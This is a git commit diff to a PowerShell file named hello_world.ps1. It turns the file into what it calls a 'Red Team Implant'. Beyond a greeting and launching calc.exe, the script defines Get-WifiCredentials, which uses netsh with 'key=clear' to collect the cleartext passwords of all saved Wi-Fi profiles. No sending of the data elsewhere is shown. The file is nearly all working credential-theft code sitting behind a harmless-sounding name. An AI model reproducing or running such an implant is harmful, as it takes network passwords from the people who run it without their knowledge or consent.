9a1c71b2388ba08a3a6b85590bd12106e4fda100
Ring0 <60684366+S3VzaHk@users.noreply.github.com>
2025-09-27 11:05:08 +0900

    Update hello_world.ps1

--- hello_world.ps1
+++ hello_world.ps1
@@ -1,16 +1,19 @@
-Write-Output "Hello World"
+Write-Host "Hello World from Kushy Red Team Implant"
 Start-Process calc.exe
+
 function Get-WifiCredentials {
-    (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object {
-        $profile = ($_ -split ': ')[1].Trim()
-        $password = (netsh wlan show profile name="$profile" key=clear) -match 'Key Content' |
+    netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {
+        $_ -match ':(.+)$'
+        $profile = $matches[1].Trim()
+        netsh wlan show profile name="$profile" key=clear | Select-String 'Key Content' |
             ForEach-Object {
-                ($_ -split ': ')[1].Trim()
+                $_ -match ':(.+)$'
+                [PSCustomObject]@{
+                    Profile  = $profile
+                    Password = if ($matches[1].Trim()) { $matches[1].Trim() } else { 'N/A' }
+                }
             }
-        [PSCustomObject]@{
-            ProfileName = $profile
-            Password    = if ($password) { $password } else { 'N/A' }
-        }
     }
 }
+
 $credentials = Get-WifiCredentials
